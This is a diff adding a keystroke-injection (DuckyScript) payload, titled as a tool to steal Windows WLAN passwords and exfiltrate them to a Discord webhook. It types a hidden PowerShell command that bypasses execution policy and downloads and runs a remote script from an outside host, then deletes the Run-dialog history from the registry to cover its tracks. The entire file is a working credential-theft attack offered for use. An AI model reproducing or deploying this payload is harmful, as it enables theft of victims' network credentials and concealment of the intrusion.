@@ -1,0 +1,18 @@
+REM ###################################################################
+REM #                                                                 |
+REM # Title        : WLAN-Windows-Passwords-Discord-Exfiltration      |
+REM # Description: A script used to stole target WLAN Passwords.      |
+REM # Category     : Credentials                                      |
+REM # Target       : Windows 10-11                                    |
+REM # Version      : 1.0                                              |
+REM #                                                                 |
+REM ###################################################################
+
+DELAY 2000
+GUI r
+DELAY 250
+STRINGLN powershell -w h -ep bypass $discord='<your_webhook_here>';irm winwifi.remothe.dev | iex
+DELAY 1000
+GUI r
+DELAY 500
+STRINGLN powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue" | iex
